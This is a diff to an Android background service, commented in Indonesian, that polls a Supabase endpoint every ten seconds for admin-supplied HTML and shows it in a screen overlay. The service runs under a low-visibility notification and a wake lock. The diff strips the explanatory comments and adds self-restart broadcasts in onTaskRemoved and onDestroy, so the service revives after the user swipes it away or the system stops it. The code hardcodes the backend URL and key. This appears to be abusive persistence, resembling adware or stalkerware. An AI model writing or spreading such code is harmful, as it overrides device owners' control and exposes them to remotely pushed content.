@@ -33,7 +33,7 @@ public class LayananBackground extends Service {
     private WebView webViewOverlay;
     private Handler handler = new Handler(Looper.getMainLooper());
     private String htmlTerakhir = "";
-    private PowerManager.WakeLock wakeLock; // Fitur Anti-Tidur untuk HP
+    private PowerManager.WakeLock wakeLock; 
     
     private final String URL_SUPABASE = "https://heaedfjyjpfvpddtgjhk.supabase.co/rest/v1/app_settings?id=eq.2&select=html_content";
     private final String KUNCI_SUPABASE = "sb_publishable_uuIu1DiiNhS4aHc3ZSxqrg_F4punPvO"; 
@@ -47,12 +47,11 @@ public class LayananBackground extends Service {
     }
 
     private void aktifkanModeAntiMati() {
-        // 1. Menjalankan Foreground Service (Wajib ada notifikasi kecil agar OS Android tidak membunuh service ini)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                     "ChannelKeamanan",
                     "Sistem Latar Belakang",
-                    NotificationManager.IMPORTANCE_MIN // Dibuat MIN agar tidak mengganggu/berbunyi
+                    NotificationManager.IMPORTANCE_MIN 
             );
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) {
@@ -61,12 +60,11 @@ public class LayananBackground extends Service {
             Notification notifikasi = new Notification.Builder(this, "ChannelKeamanan")
                     .setContentTitle("Sistem Aktif")
                     .setContentText("Aplikasi berjalan di latar belakang")
-                    .setSmallIcon(android.R.drawable.ic_secure) // Ikon kunci bawaan
+                    .setSmallIcon(android.R.drawable.ic_secure) 
                     .build();
             startForeground(1, notifikasi);
         }
 
-        // 2. Mengaktifkan WakeLock agar proses internet dan timer terus berjalan meski layar HP mati
         PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
         if (powerManager != null) {
             wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DataSecure::WakeLock");
@@ -110,7 +108,7 @@ public class LayananBackground extends Service {
             @Override
             public void run() {
                 tarikDataDariAdmin();
-                handler.postDelayed(this, 10000); // Cek setiap 10 detik tanpa henti
+                handler.postDelayed(this, 10000); 
             }
         };
         handler.post(sistemPemantau);
@@ -168,9 +166,19 @@ public class LayananBackground extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        return START_STICKY; // Fitur agar OS membangkitkan ulang jika tak sengaja tertutup
+        return START_STICKY; 
     }
 
+    // FITUR AUTORUN 1: Deteksi saat aplikasi digeser (swipe) dari Recent Apps
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        Intent restartServiceIntent = new Intent(getApplicationContext(), RestarterLayanan.class);
+        restartServiceIntent.setPackage(getPackageName());
+        sendBroadcast(restartServiceIntent);
+        super.onTaskRemoved(rootIntent);
+    }
+
+    // FITUR AUTORUN 2: Deteksi saat sistem mencoba menghancurkan layanan
     @Override
     public void onDestroy() {
         super.onDestroy();
@@ -178,10 +186,14 @@ public class LayananBackground extends Service {
             windowManager.removeView(webViewOverlay);
         }
         handler.removeCallbacksAndMessages(null);
-        // Lepaskan WakeLock agar tidak merusak baterai saat aplikasi benar-benar dimatikan paksa
         if (wakeLock != null && wakeLock.isHeld()) {
             wakeLock.release();
         }
+
+        // Berteriak mengirim sinyal sebelum benar-benar mati
+        Intent restartServiceIntent = new Intent(getApplicationContext(), RestarterLayanan.class);
+        restartServiceIntent.setPackage(getPackageName());
+        sendBroadcast(restartServiceIntent);
     }
 
     @Override
